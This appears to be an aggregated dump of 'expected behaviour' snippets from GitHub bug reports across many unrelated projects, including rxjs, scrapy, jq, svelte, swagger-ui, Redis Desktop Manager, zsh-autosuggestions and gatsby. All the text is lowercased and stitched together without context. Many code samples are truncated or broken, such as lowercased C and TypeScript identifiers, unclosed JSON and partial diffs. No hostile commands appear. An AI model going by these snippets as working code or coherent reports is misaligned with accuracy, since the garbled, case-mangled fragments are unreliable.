same as with `buffertime`? i am pretty new to rxjs, just experimenting with operators.
for races won via completion or error, the behaviour should be like this code and subscriptions to subsequent source observables should not be made: ```ts
race( defer(() => { console.log("subscribed to 1"); return of(1).pipe(delay(100)); }), defer(() => { console.log("subscribed to 2"); return of(2); }), defer(() => { console.log("subscribed to 3"); return of(3).pipe(delay(300)); })
).subscribe({ complete: () => console.log("won"), error: () => console.log("won with error")
``` will output: ```
subscribed to 1
subscribed to 2
when using `defer` with a `() => void` factory, the return type will be `observable<never>`.
the snippit above should complete and log the response to the console.
`forkjoin(promise)` should behave the same as `forkjoin([promise])`, like it does for observable.
it shouldn't error.
the sample code in current behaviour section should infer `observable<never>`
it should infer `observable<[string, number]>
if there are no longer any subscribers, the socket should be terminated as soon as it's finished connecting.
umd rxjs file will only inject global variable `rxjs` to global/window.
the order of import should not matter, and the `jest` environment would work like `webpack`.
errors have stack traces
in 2 last **console.log(subject.observers.length)** it's expected to have **0** : observer should be removed from array of **observers** after **unsubscribe()**
no build error.
it should work like it did in 6.2
should alert "foo"
i expect all websockets to be closed in the end, and that all subscribe/unsubscribe messages are send.
i would expect the observable symbol interop to be used before any other.
all exported items are in the csv files
2.2.0 and previous versions have allowed the request to go through even when cookie isn't properly formatted (in our case we are passing cookies from selenium webdriver to scrapy so we don't do any cookie formatting ourselves).
ignore the <base> element.
command scrapy should work
for any implementation of spider callback the sequence of process_spider_exception executed once
after login into the spider is redirected to and locates and prints the text of the log out link on the right top side of the page for version 1.6.0 and also 2.3.0
refer to valid `[login] info: logout` vs invalid `[login] info: none`
i expect to still be able to execute `scrapy` or `python` commands.
2020-06-10 10:50:27 [test] info: storing in thread: gs://bucket/output.json
2020-06-10 10:50:27 [test] info: storing in thread: gs://bucket/output.csv

2020-06-09 19:23:03 [scrapy.extensions.feedexport] info: stored csv feed (10 items) in: gs://bucket/output.csv
the spider should run fine, without exceptions
i would expect a spider to resume its job may be repeating parsing , well, few pages from previous run, but not having to start parsing the site from the very beginning
cert is not empty
no error is raised
without garbled code
files should not be downloaded again when running the spider consecutively
if a file is allready on gcs (same folder), it should not be downloaded (provided it was uploaded less than 90 days ago)
scrapy commands work as documented, as they have in the past.
`process_spider_exception` is called for this exception
in the spider, `isinstance(response, textresponse)` should be `false`.
return non-zero exit code
it is not forbidden.
it should naigate to
redirect to ` ` as browser `mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/76.0.3809.132 safari/537.36` do.
no exception
ideally would be possible to add args to the contract (e.g., `@url foo`)
`itemloader` initialized from the `x` item does not reprocess its fields and loads `{'x': 'value1'}`.

# cat test.json | jq \'.[] | select(.value|test("pattern"))\'
{ "key": "domainname", "value": "pattern.example.com"
as the manual states:
> **stderr**
> prints its input in **raw** and compact mode to stderr with no additional decoration, not even a newline
i expected the program to output be:
**output:** `[1,0]` **environment:**
[jqplay]( **note**
- if you replace `>=2` with `>=7` then `7` is deleted.
- if you replace `>=2` with `>=5` then **only** `5` is deleted.
returns non-zero status.
the argument name should not conflict with names in scope when value-argument shorthand is used
slight semantic change but i'd argue it's less confusing.
the data type should be preserved in output as it was in input
certain json-processing libraries, when the they compare two json objects, they also compre the type
this means that json that had been processed through `jq`, even if it was a nop, would have its type meddled, and therefore fail
in the example above, input `float` data type is modified to an `int` type.
jq should not segfault on valid input.
i would expect the 0a to not even be injected in this example - or it should be injected at the very end of the line.
atleast version should be displayed
a build for several archs including arm64.
the output of `jq` to specify the correct timezone following dst
$ /mingw64/nightly/jq --version
$ /mingw64/bin/jq -n \'"test" | halt_error(1)\' # expected output: next line
i'd expect the result to be `null` in both cases.
% echo \'["282324313233842176"]\' | jq ".[] | tonumber"
``` i assume this is what is going on: ```ruby
>> "%b" % 282324313233842176.0
=> "1111101011000001000111011110010001110000100110000000000000"
>> "%b" % 282324313233842180.0
=> "1111101011000001000111011110010001110000100110000000000000"
``` but, i can't actually reproduce the result output using c's conversion functions: ```c
#include <stdio.h>
#include <stdlib.h> int main() { const char * s = "282324313233842176"; float f = strtof(s, null); double d = strtod(s, null); long double l = strtold(s, null); printf("bad/jq =\ 282324313233842180\ "); printf("s = %s\ ", s); printf("f = %f\ ", f); printf("d = %f\ ", d); printf("l = %lf\ ", l); return 0;
``` outputs: ```
bad/jq = 282324313233842180
s = 282324313233842176
f = 282324315083374592.000000 (obviously wrong by a wide margin)
d = 282324313233842176.000000
l = 282324313233842176.000000
maybe this is just a width problem?
expected jq-1.5 output to appear in both cases
an error, not an assert.
```{"module":"sodimm"}``` **actual behavior**
jq: error: syntax error, unexpected module, expecting ident (unix shell quoting issues?) at <top-level>, line 1:
{ $module, }
`nth($n; exp)` should probably be analogous to `[exp][$n]` (i.e
`([exp]|.[$n])`), except less expensive and without evaluating the $n+1th and subsequent outputs of exp
one thing to note is that `$array[$n] != $array[:$n][-1]`, but more closely matches `$array[$n:][0]`..
if $n is greater than the number of outputs, i'd expect to get back either empty or null
this implies something more like the following: ```
def drop($n; g): foreach g as $_ ($n; .-1;
< 0 or empty|$_);
def nth($n; g): first(drop($n; g), null);
jq would identify itself as source of error
so above message would say:
jq: parse error: invalid numeric literal at line 1, column 18
the first line should raise a "normal error" not a null
**environment**
tested in macos 10.14.3 using jq 1.6
ubuntu 18.04.2 lts using jq 1.5
failed test within appveyor will give a failure status for the tests instead of seemingly passing.
'@sh' should not change the exit value.
// doesn't work:
sh$ az account list --query '[].id' | jq '.[]'
"a86bc126-xxxx-xxxx-xxxx-7e546be7a509" // expected
parse error: invalid numeric literal at line 2, column 4 // actual
``` // works:
sh$ az account list --query '[].id'
[ "a86bc126-xxxx-xxxx-xxxx-7e546be7a509"
sh$ echo \'["a86bc126-xxxx-xxxx-xxxx-7e546be7a509"]\' | jq \'.[]\'
"a86bc126-xxxx-xxxx-xxxx-7e546be7a509"
as in the manual mentioned the output should look like this i think:
``` like the --arg option works:`jq -c --arg first 123 '[$first]' <<< '[]'`
output:`["123"]`
i am expecting the same error report from both cases.
the above should output `"2018-08-31t00:00:00z"`, not `"2018-08-31t01:00:00z"`.
`fromdate|todate` and `todate|fromdate` should probably be idempotent.
preserve the parentheses in this case
notably, when the parentheses are around the logical operator like `1 ?? (2 || 0)`, the output still contains the parentheses.
i would expect promise results to persist between renders.
when opening the `<details>` element, the color should change to pink as per my css rule i specified
see this codepen for the desired behvaiour:
i expect to be able to use `let` and destructuring assignment with store objects just the same as i can with any other type of value
this works just fine, for example:
```javascript
({ store1, store2,
} = {store1: \'value1\', store2: \'value2\'}); // store1 => "value1"
// store2 => "value2"
so i don't think there's anything wrong with my javascript
so what is so special about _stores_ as values that would make it not work? and why does `let` vs
`const` make a difference here? is the svelte compiler doing something special with `let`s (even though i'm not using `$:` here) that is causing this strange behavior?
a warning should be raised.
in the above repl, i would expect the "dismiss" button to still be on the screen and inside of a red box.
only the `$: user = ...` declaration should have a `let` prepended.
previously to v3.24.0, it was possible to use $$props this way without any issue.
catch at compile time if possible
not sure how feasible that is due to possible aliasing? regardless, some way to avoid crashing the page would be good
maybe remove the key related to the bound variable from the changes object when spreads and binds are being used.
apparently, the ideal solution would be to exclude `import` bindings from `$capture_state` (see [discussion in the previous issue]( #issuecomment-605404910))
but if i haven't missed anything, we apparently can't tell from `$capture_state` which variables are imports? i don't think it's worth adding tracking of this information (if it's not already there) just for this feature
so i suppose we should settle on excluding either `hoistable` (i guess all imports have to be hoistable, right?) or `writable` variables
for hmr it won't make a difference which one we pick
i suppose `hoistable` is preferable if it works as a fix, since previous discussion has concluded that it was desirable to capture writable state
i can make a pr but i'd like to confirm what needs to be done
cc @redhatter @conduitry
`1 - 2` is logged
value should be in sync.
i would expect both builds to be consistent
apart from that i guess i would the comment to not have an effect? but i'm not sure, if i'm using the comment incorrectly.
not crashing
there should be no warning since the element has content bound
i haven't tested with other parameters to see if the warning goes away.
no errors are shown and changing the property of the store should work also in the component that uses auto-subscription
the value of the element's innertext should reflect exactly what is typed.
the autofocus attribute to work as expected
transitions should work on both adding a removing a table row.
throw an error instead of crashing.
i expected an exception to be thrown after a second (which it indeed does if you comment out the first settimeout)
instead, it logs the most recently-updated component, which is not at all guaranteed to be the current one.
the current behaviour is correct, aside from the error
**information about your environment:** - svelte version 3.22.3
the first if should evaluate based on the condition, not always be false.
each static thing output as many times as there are entries in the array
```
{#each arr as i}
i've tried to read documentation and tutorial to see if there is some reserved word that i can not use as component name, but i couldn't find it
so i think we should allow `anchor` as component name?
free therapy.
property inside an object should change when input changed
the compiler should issue an error (or perhaps a warning)
not only it doesn't work as expected but it also breaks reactivity
assigning primitive items from an `#each` block should nor be permitted at all.
toggling the column should cause 3, 6 and 9 to smoothly move to their new location
to achieve this, i think we'd need to measure dom nodes before any dom updates happened at all, which sounds tricky to do.
keep the comment in the ssr
probably this is because of this todo:
#l5-l9
here is what it looks like on chrome: [
and here is the buggy safari behavior: [
text should be updated.
- directives should be called only once when the component is mounted
- alternatively, if the element is remounted, "destroy" should be called beforehand (e.g
to free previously created resources)
**information about the svelte project:**
- svelte version: 3.20.1 (bundled with rollup)
- browser: (latest) chrome on macos
imo the compiler should throw an error instead of generating code for this.
even if there's a bug preventing the entered code from compiling correctly, i should always be able to rewrite the code and try to make the new code compile, and i should always be able to save new versions of the code to my github account.
like `type="text"`, `type="number"` should allow `mynum`\'s change in value to affect renders.
no error is thrown.
this useless function must be created but since it's not called, nothing special should happen.
should build **svelte version**
3.20.0 and 3.20.1 rollup
this compiles without an exception.
the reactive statement should be executed on load
input type range value 0 is included to the html.
there should be no error massage in the console.
the existing html should be replaced, but it is not.
working without any error.
same as
keep white space
it would be nice if checking/unchecking one 'a' would result in just one instance of the value being added to the array, and would also cause the other one to be checked/unchecked in sync.
the `<select multiple>` value should be set.
the pattern `export let myfunc = getcontext('myfunc') || (v) => v;` should not cause any kind of error.
adding items via the input shouldn't have any effect, because the array is being mutated but not reassigned.
i'd expect not to get any errors, or a nicer, sveltier way to achieve dynamic type-attributes.
i would be expected to be able to bind:this using a yielded value a strange thing is if i store the list in a new variable which i then use in `#each` it works as expected: ```
const foolist = [...foo()] ..
{#each foolist as f,i}
the `<title>` should remain after hydration.
subscribing to and unsubscribing from a store derived from an observable should work
in particular, this means the 'look to see whether there's an `unsubscribe` method to call instead' logic we use elsewhere should also be use in the `derived` implementation.
the commentaries are not removed by svelte.
the parenthesis should not be removed in the generated javascript.
you should see `true` two times
i'd expect this to crash, but it doesn't
there _is_ an exception if you use `settimeout` instead of `onmount`.
components are working as classes weren't written in multiple lines.
i would expect the white space to be rendered into the html as white space characters, like the first `<div>` above.
`offsetheight` should be something close to `800` (in the example above) **notes**
is there a reason svelte doesn't attempt to use a resizeobserver for resize detection?
this should simply assign to the global `document` and not attempt to automatically declare it
what's printed in the console should reflect the current value of the array.
upon filtering "bob", "bobby" should be selected
or svelte could warn about these scenarios, if possible, and instruct to use a keyed each
and svelte could fallback to re-rendering entire each block or something so that it at least gets rendered correctly
but not sure on internals...so.
i expect that the action will be called after the node has been attached to the dom
because this is how it worked in the past versions.
i expect the animation to work in all cases (in all browsers).
would like params to be passed to the returned svelte component (from find_component).
click event shouldn't do anything (i.e
no exception).
`store` should have `referenced: true`.
elements declare themselves visible, because they are.
with and without transition slots should work good
should compile and generate `require('./a.js');` in the example provided above
**stacktrace**
/project-dir/node_modules/svelte/compiler.js:21095 id: node.specifiers[0].type === 'importnamespacespecifier' ^ typeerror: cannot read property 'type' of undefined at /project-dir/node_modules/svelte/compiler.js:21095:41 at array.map (<anonymous>) at cjs (/project-dir/node_modules/svelte/compiler.js:21090:36) at create_module (/project-dir/node_modules/svelte/compiler.js:21002:17) at component.generate (/project-dir/node_modules/svelte/compiler.js:24900:14) at object.compile (/project-dir/node_modules/svelte/compiler.js:25965:23) at object.<anonymous> (/project-dir/compile.js:6:23) at module._compile (internal/modules/cjs/loader.js:1121:30) at object.module._extensions..js (internal/modules/cjs/loader.js:1160:10) at module.load (internal/modules/cjs/loader.js:976:32)
it should render the if block
two-way binding between (inputs or component props) and (the `then` of an `{#await}` or any expression based on that) should throw an error refusing to compile.
both `<text>` elements should contain `foo bar`, not `foobar`.
the compiled module should have two exports: the default component export and the module context export: ```js
export default app;
export { x }; // this line is missing!
``` **information about your svelte project** - svelte version: 3.15.0
the styles this produces should continue to be lightly minified - whitespace should be removed, semicolons right before closing braces should be removed, etc
this stopped working between 3.12.1 and 3.13.0.
i would expect either the each block to use the parents value or for the svelte compiler to warn about let directive variable already being defined.
no warning.
async function is compiled to an async output
svelte will not collapse object literal declarations into the short form for keywords.
i'd like to be able to keep a reference to the item and render an appropriate label
i guess given how funky this control works in the browser i'm not sure what the ideal way to handle it is.
conduitry suggested in the discord that this should be replaced with indexof to avoid having to use a polyfill
```diff return { c() { img = element("img"); this.h() }, l(nodes) { img = claim_element(nodes, "img", { src: true }, false);
- var img_nodes = children(img);
- img_nodes.foreach(detach); this.h(); }, h() { attr(img, "src", "donuts.jpg"); },
the range input should look the same before and after changing `max` and `value`
the derived store should update
it doesn't, because only the local `$y` variable is updating.
svelte shouldn't attempt to assign to `input.files`
dependencies in `package.json` in the downloaded zip should look like this:
"dependencies": { "sirv-cli": "^0.4.4", "leftpad": "latest"
but actually looks like this:
"dependencies": { "leftpad": "latest"
in the example provided, the readonly attribute should be omitted if false.
it should work like repl 2
compiling as expected, as with 3.12.1.
the component should unsubscribe from the old store and subscribe to the new store.
the old elements should get removed
components should be destroyed
the `inner` component should unsubscribe from the old store instance and then subscribe to the new store instance so that the value propagates properly.
in the repl example when clicking the button the first time count should be 2 and after pressing the button a second time the count should be 6.
i expect both versions to work.
presumably the ` || ` part just shouldn't be there, but i haven't checked whether that code would do what is expected.
expect to see two lines of "hello"
the second "hello" inside `<i>` didn\'t show up as expected.
- proper compilation without errors
same behavior as non ssr.
when `visible` becomes false, an alert should appear.
the assignment of an undefined value would work like null assignment (input displays empty)
or if this is undesired it would be nice if the initial rendering would also display `undefined` so that its more obvious that assigning undefined values is the wrong thing to do.
`(1 === 1) === true` output is: ```js
t0_value = 1 === 1 + ""
``` and should be something like: ```js
t0_value = (1 === 1) + ""
hello world
i would expect all three lines of the repl to have red text
only the second and third do.
```diff return { c() { foo.$$.fragment.c(); }, m(target, anchor) { mount_component(foo, target, anchor); current = true; }, - p(changed, ctx) {
- var foo_changes = {};
- if (changed.y) foo_changes.x = y;
- foo.$set(foo_changes);
+ noop, i(local) { if (current) return; transition_in(foo.$$.fragment, local); current = true; }, o(local) { transition_out(foo.$$.fragment, local); current = false; }, d(detaching) { destroy_component(foo, detaching); } };
i expected to be able to use spread props along side explicit props and that everything is reactive
note i was not able to reproduce unless the prop being spread was inside a #each and deconstructed.
but, if assignment take out to before the compare, it worked, as it should: <script> let toggle = false; function _toggleme() { toggle = !toggle; if (toggle) { console.log(toggle); } else { console.log(toggle); } } </script> <button on:click={_toggleme}>click</button> <span class="text {toggle ? "red" : "blue"}"> text </span>
expected that binding to an alias would be consistent with binding to an unaliased export.
i expected `w` and `h` to be correct by the time the `onmount` code ran
i'm not certain if that's a reasonable expectation.
no cycle detection bug error for any variant of this problem
editing the text input should update the store
consistent behaviour across all modern browsers
code compiles.
compile as is or just disable iife usage as key.
given this code..
<script> let color = 'red';
</script> <h1 class={color} style="color: {color}">color: {color}</h1>
``` ...no update could should be generated, since `color` could not change
this works correctly for regular attributes: ```diff return { c() { h1 = element("h1"); t0 = text("color: "); t1 = text(color); attr(h1, "class", "" + null_to_empty(color) + " svelte-1fyrt1w"); set_style(h1, "color", color); }, m(target, anchor) { insert(target, h1, anchor); append(h1, t0); append(h1, t1); }, - p(changed, ctx) {
- if (changed.color) {
- set_style(h1, "color", color);
+ p: noop, i: noop, o: noop, d(detaching) { if (detaching) { detach(h1); } } };
i expect either the true or the false sections of the if statement to show, not both at the same time.
`svelte.preprocess` type definition should accept both asynchronous and synchronous preprocessors.
just work as it should be.
the update to `value` should propagate downward to `refactoredbutton`
the behavior of clicking the inline button and the refactored component should be the same.
i don't think `$style = get_store_value(style);` should be output twice.
characters not deleted
when you click the button the text should change from "hi" to "changed" like it does in 3.6.1
i think this was caused by same refactor as
in that $$props is not seen as dynamic (it is added the dynamic attributes, but skipped when considering the slot redraw)
value of the variable passed to an event handler is reactively updated.
in the repl, expected behaviour is that the heading colour changes and the text changes its wording to include the selected colour
(this can be seen in the 3.6.1 link) what happens:
the text colour changes, but the wording doesn't change.
the chunks of the attribute should be concatenated without commas
the `data-foo` attribute should be not present when the checkbox is unchecked, not the string `'null'`.
it should compile without errors since the input image element has an alt message.
it should work, as if i had written the space after the `}`.
it might be nice if a warning was printed about the missing property
but the easy immediate fix is to always pass an object, i.e
`$$slots.default({})`
this way there\'s no disparity between `<slot>` and `<slot someotherproperty="whatever">`.
runs without error.
waggling the slider should only cause `a` to show up as having changed
with the spread version, `c` also appears to have changed.
waggling either slider should cause things to be logged to the console.
i expect all children to slide in together, as it did in v3.6.3.
alternatively i'd expect the child with the transition on it to slide in when the others are done or something.
examples provided via `examples` definition should be rendered respecting the content-type.
execute operation should not give validation error if there is a default selected value.
both using 'application/json' or 'multipart/form-data' sending data and caught by beckend
no error messages.
i'm expecting the request to be sent to the server or some kind of message telling me why the execute didn't work
it's a bit strange to click on the `execute` button and having nothing happen.
the callback is notifying the api user via a network request that the user was created (maybe this process takes a while)
i would expect it to contain the `name` and the autogenerated `id` but not the private `password`
i would expect the callback *request* to have the same schema as a get *response* not a post *request*
{ "id": "string", "name": "string"
the swagger-ui with a filter field and all of the endpoint is shown
### actual behavior
the swagger-ui with a filter field and no endpoints is shown
the endpoints are filtered by the text "true".
the request should be made to the appropriate endpoint
instead, the request is not made at all
the path item should open in place.
-d "str=&num=&bool="
that is, all required fields are sent, even with empty values
### actual behavior
that is, the `str`, `num` and `bool` fields are not sent, even though they are required.
-d "foo=value"
``` ### actual behavior
-d "foo=value&bar=1"
note the extra `bar=1` parameter which is not actually present in the schema for `application/x-www-form-urlencoded`.
displays correctly, with css loaded
401 response for 4xx is valid
authorization popup with form to be shown.
the read-only property should be hidden in methods such as `post/put`
user should be able to authorize/logout/authorize/etc in the same pop-up.
i'd expect to see the spec from the configured url
choosing a file should allow the request to be executed
this problem is not present in swagger ui version `3.24.3`.
all fields should be displayed which are defined in the swagger file.
when authorization scheme value is wrong (basic instead of basic) do not show (http, basic) authorization in `available authorizations` modal
or better show a warning about an unsupported authorization method.
deep linking works
the editable request body box should show the appropriate content.
i imagine it would be the input with a red color and shaking, as when a value is required but doesn't use `anyof`
like: ![selection_031](
an error message or some state change that makes it clear that the input is invalid.
the computed url should always be the value used for the server url in a request.
if global url parameters are defined, they should be displayed as if they were added directly to method
i expect that topbar will be with empty selector.
the description should be shown above the file input box
the warning about examples shouldn't be shown if none are specified.
the validator badge should not show up at all.
when the link is visited to jump from one page directly to the get call for location/getlocation - i expect the page to scroll down, just like the example in #issuecomment-415305023 where it goes to /pet/addpet as a direct jump.
all new lines in parameter description to be rendered as separate lines in html
the parametermacro function is executed and set's a default value for the parameter.
request body `example` appears even if `schema` is not defined.
the request should be made with http, not https.
expected to see only date in example
"startdate": "2018-12-25",
the following attributes should exist in the schema:
* regionmapping
* accountname
* accountstatus
the operation expands, allowing me to view and try it.
rendered to continue to work and not crash allowing validation to reassert itself.
you can successfully log out and authorize again with authorization code flow
better wrapping and space distribution
wrapping would ideally occur at a '/' in the path and more horizontal space should be given to the summary.
`swagger-config.yaml` changes the defaults but is overridden by other config mechanisms.
all components should be shown equally.
with `urls.primaryname` option, swagger-ui should process the matched spec name
so the v1 spec should be loaded when visit the ui initial page.
the operation should be expanded be scrolled to even if the operation has a space in it.
the 'type' parameter is dropped from the form data portion of the curl when there is no recognized type.
should provide a "try out" to get the entities from the service.
since the `url` configuration parameter is supposed to be ignored, the page should load with the first url listed by the `urls` configuration parameter.
spec selextor textbox updates with changes made by interceptor.
i would expect it to use both the settings from the config file found from the config_url and also to load the api docs from the api_urls.
{ "topiclist": [ { "eventid": 389, "eventname": "tcnp channel is initialized", "eventtype": "system", "eventlevel": 2, "sourceid": "62", "sourcetype": "tcnp_channel", "updatedtime": 4327849327 } ], "target": "pronettopic"
``` ### problems ( compare with expected behavior )
{ "topiclist": [ { "value": { "eventid": 389, "eventname": "tcnp channel is initialized", "eventtype": "system", "eventlevel": 2, "sourceid": "62", "sourcetype": "tcnp_channel", "updatedtime": 4327849327 } } ], "target": "pronettopic"
``` ![cap1]( ### question
problem is the "value" is printed.
i saw swagger docs, and followed the api
but i encountered this problem.
something wrong with me??
_copied from original issue: swagger-api/swagger-editor#1893_
required property should be marked by red asterix
deep linking works :smiley_cat:
the curl command is generated appropriately.
callback operation parameters rendered and display without exceptions.
the spec should be detected as oas3 on subsequent calls to `swaggerui` or `swaggeruibundle`.
empty requestbody is ignored, description of path is avaliable
or i can see an error while
i think there are two issues here: 1
the "type=" option tha specifies the content-type for the "options" part is missing - i feel it should be "application/json", since that is the default for "objects"
the "type=" option is actually present for the "myfile" part, which is great
the quotes for the "options" part need to be single quotes, e.g
`-f \'options={ "some_array": [ "string" ], "max_bar": 0 }\'`, not `-f "options={ "some_array": [ "string" ], "max_bar": 0 }"`, as having double-quotes everywhere will just cause the shell to strip them.
the localtestuser security scheme should be available in the authorize dialog.
i would expect the provided description to be showing up underneath the resource, or at least somewhere in the ui.
i would expect a message similar to "no example values are available for content type application/octet-stream" to be shown in the place of an example value for responses using application/octet-stream.
the displayed curl request should not be undefined.
it should display the same information regardless the number of calls
it should not store any information about the first time it was invoked.
the request url should be ```
/foo?test=correctoption
``` ### actual behavior
the request url is ```
/foo?test=wrongoption
response example is displayed as
{ "status": "ok", "$ref": "#/definitions/foo"
errors should be rendered.
the model should contain values such as id and username
corresponding values should then be shown in the "example value" box also.
ui sends the http request and display the results
i expect that getting the link url from an operation gives me a correct deeplink, e.g
#/pet/addpet
no red messages please
inventoryitem and type to become individual definitions
swagger-ui will send the enum value i choose instead of the first enum value.
using oauth2 with authorization code flow should work while using
correct schema should be used
linebreaks are converted to spaces
contiguous lines are combined in a single `<p>`.
i would expect to see the example xml for the response.
the json should just be:
{ "a": "string"
it shouldn't allow to authorize an empty textbox
the server url used in fetching an oauth2 token is the one shown in the `server` dropdown.
there is no warning shown.
when the header field is empty no header should be sent since it is configured as optional
the form should not clear
you can see this behavior in public/good.html
`$ref` links should not be resolved in examples.
would be nice to have any workaround for it
"test-value" would be set in the testheader input field.
all model names should be the same before and after expansion
### actual behavior
the model names after expansion differs from the name before the expansion, for `three` and `other`.
the id should be a valid html id, like on the operation section itself:
<h4 class="opblock-tag" id="operations-tag-pet_store">...</h4>
the model name should be the same before and after expansion
### actual behavior
the model name after expansion differs from the name before the expansion.
data should render properly like it did with swagger 2.0 ui
and age2 <> 3 age2 == 3 ge2==3
even though it's caller's failure and incorrect operation, but i think fix it better for improve user experience.
tdengine 0 00 00

i would expect the installer to load all prerequisits.
it shoud show me a window
launching without an error.
the copied contents contains only the plain textual value, not the html source of the editor.
should work the same way when a domain name is used.
i am expecting to be able to connect to a redis server configured to use tls running in docker even if the certificate is self signed
expected rdm to launch but it doesn't
i would like to be able to resize the window and have scroll bars for top-bottom and left-right scrolling/navigation
**environment**

show value.
all affected keys deleted
see formatter available in drop down, and a status panel available in settings menu
can click things.
size of dialog should not exceed size of screen.
see key vlaue
program should run.
deserialized value by rdm built-in msgpack serializer
json string should be saved correctly and should not remove spaces inside string values just because there are curly braces in the string.
i expected to successfully connect using rdm **environment:** - os & version: macos mojave version 10.14.16 - redis-server version 5.0.7
key should persist.
tool works without crash
because source code in this repository is licensed under gplv3, any agreement regulating distribution (binaries and derivative works included) should be gpl-compliant.
can view the data in string or bytes format, not crash.
.expect ./configure available
should be able to connect after a restart.
no login promt everytime
should login and execute the app
no obligratory sign in / telemetry should be kept to an absolute minimum and nothing should be going back and forth for a locally installed app..
i can see gdpr issues...
application runs normally
it should build
open the program and no error message appear.
i expect it to connect.
redisdesktopmanager scan keys quietly, don\'t "make global lock or other similar"

only one node should be shown for each key
keys are unique.
app not to crash
just show the data correctly.
scroll bar should be drag able with mouse.
horizontal scrollbar working on console window
copy very long text to clipboard, and working drag.
filtered keys from the namespace **actual behavior**
all the keys from the namespace
`0!` should evaluate to 1
i expect files to show up in the search.
runs fine without problems
both textboxes: `querytextbox` and `querytextsuggestionbox` should be empty at this point but as you can see on the git for a split of second old suggestion appears
all typed digits should be properly registered for the calculation
it can get the environment variable.
![image](
the first result from the "file" query should be highlighted by default.
"sticky notes" should be the first result instead of "system information", because "sticky notes" has a perfect mapping to the query.
the '1' and '2' represent the two parts of the bug above 1) you should be able to type text right away when pressing win+r and opening the wox shell plugin prompt, without having to manually focus it by clicking it with your mouse
2) there should not be any cases in which pressing win+r results in opening windows "run" executable prompt, excluding the situation where this is manually disabled by the user in shell plugin settings
a wox window should be launched.
no exception appears
results are somehow related to search
you can change the color of the cursor to the same as the dark theme.
- installer should not remove theme files on installation
launch wox by hot key
accept my key and respond correctly
for it to give me some sort of interface to change the action keyword
should work without oh-my-zsh
i shouldn't be getting the output shown
i am not able to do stuff this way
within both (1) and (2), both suggestions should be highlighted in the same color
the standard completion suggestions
after `$ ls /tmp`, i'd expect `$ ls <escape>` to leave me in vicmd mode with the command line being `$ ls ` at that point and no remnant of the prior `/tmp` suggestion.
default color should be dark gray
the completed string should be the default text color
no error message should be displayed and plugin loaded.
if it is unclear it should not auto-complete in the prompt but show the list right away
curl -h "host: localhost:8080" -h "hello: hello"
zsh: no matches found:
the tips section should be gray.
only the first character of the suggestion (`o`) should get accepted.
color of all lines are the same.
the suggestion should have be cleared when the history word is inserted.
there should be no autosuggest visible.
clearing autosuggestions after enter
i would expect terminal2 to autosuggest `vim test` without writing `history`.
highlight style does not change on source
auto-suggestion is shown with data coming from tab-completion.
the suggestion should be updated after insertion, or not responding to right arrow presses when text is selection if possible.
faaaaaaaaaaaaast
typing characters/commands on the prompt, should work normally (little lag is acceptable)
expected to get a dark red foreground color for the suggestion text
but instead i get the default foreground color.
it should have created `zsh-autosuggestions` directory in `~/.oh-my-zsh/custom/plugins` instead of creatign a wrong directory called `{zshcustom:-` in `~/.oh-my-zsh/plugins`.
cd test1/test2
``` ### actual behavior
cd test1/test2test2
after successfully accepting a suggestion the bell should not be triggered.
after initialization, the plugin must run `_zsh_autosuggest_bind_widgets` directly
the certificate should expire in the future.
i expect the behaviour between st and gnome-terminal to be the same.
suggested characters hould be gray (in the examples above)
accessibility tests should run #
images should be present in a production build.

generate html file.
i expect programmatic navigation using `navigate` to trigger a service worker update and show the new content.
npm run dev -> content pulled from contentful, everybody happy, page is served
propagate the error so that end users can see the issue.
the navigation background should be blue to match the paragraph text.
build finish successfully

- the filters should be added to the first page
- they shouldn't be added to the next pages (the link in `next.href` returned by jsonapi already has them)
a normal building proces and viewing my gatsby project in development mode
i would expect the url/link to the cms be output as: ` `
there shouldn't be any ssl errors.
the site builds.

there should not be a graphql error at all as everything is working properly.
now run it in develop mode
clicking on the link works fine with gatsby version up to 2.24.64, but results in the error page with 2.24.65 and above.
the website builds and is available.
a fallback type should be generated, ideally png since webp supports transparency.
build should run in a few minutes on pipelines.
no errors for missing peer dependencies
changes should be reflected directly on the browser without reloading the page after saving the file.
clear error:
"fileabsolutepath of the node provided is null, unable to generate a filepath"
both the favicon and the on page image should react to colour scheme changes.
post are shown according to sorting criteria

![screenshot (1)](
`promise.allsettled` polyfill is added to polyfills.js, as well as the application code, and safari 12 loads the inlined `promise.allsettled` polyfill since it doesn't have that native method.
gatsby should start the dev server.
it was expected that all successfully sourced images would then be successfully transformed for use with gatsby image

onrouteupdate should be called
succeful built of the cloned repo
i get no errors installing packages
no errors and normal hot reloading.
page should not break
no **warnings** or **errors**
before the update it was **not** an issue
i expect a fluent building progress, with no interruptions..
no errors should be emitted in the console.
the dropdown menu item should have the right position
i expect the development build to shut down cleanly without error when running `npm run develop`.
you should be able to use the keyboard to do anything a mouse can do (or at the very least, to scroll the page)
it seems to be something to do with the overflow styles you\'re using, but normally when an element has overflow styles the user can at least click on the text inside the overflowed element to "focus" it, and then keyboard commands work from that point on
in fact, you *can* scroll the menu to the left of the documentation using the keyboard, if you "focus" it first
there must be some other style preventing that normal behavior (or an onkey handler of some sort?)
build should be successful
should remove
it should build.
i would expect my code blocks to have some degree of syntax highlighting and at least a background color change.
the custom id string should be removed from the heading text
i should be able to use the same exact query as an export on a page that i can already use (without the tag) in `gatsby-node.js`.
the menu should have a higher z-index.
project should build successfully.
it should build.
i should not see errors and checkout should be created like on other browsers
when i add an item to the cart, everything should work normally.
images would be queried as expected
successful build with postcss compiling the `index.css` file.
the button is styled green in storybook, with the css module's styles applied.
gatsby should install without conflicting peer deps.
the image should be sized to match the viewport, either by changing the size after load in js, or by not including the inline size styles.
entries should not be duplicated or wrong altogether
they should adhere to the rules of the graphql query, only returning what is specified, even if the reference is circular
"allcontentfulmainnav": { "edges": [ { "node": { "theme": "light", "pages": [ { "route": "/who-we-are" }, { "route": "/why-we-are-here" }, { "route": "/what-we-do" }, { "route": "external-route" }, { "route": "/contact" } ] } }, { "node": { "theme": "dark", "pages": [ { "route": "/who-we-are" }, { "route": "/what-we-do" }, { "route": "/why-we-are-here" }, { "route": "external-route" }, { "route": "/contact" } ] } } ]

not just published posts.
changes are shown in the browser (
perhaps inject `<link as='font' ...>` **before** the style part will fix the issue?
gatsby develop run correct.
i'd expect webpack to give me an error report that would help me track this down
`actions` shouldn't be undefined
logging order should always be: onprerouteupdate > layout > onrouteupdate
this should be the order for both initial render and subsequent navigations.
it should compile as expected and i can use gatsby
the package shouldn't contain anything above medium severity vulnerabilities.
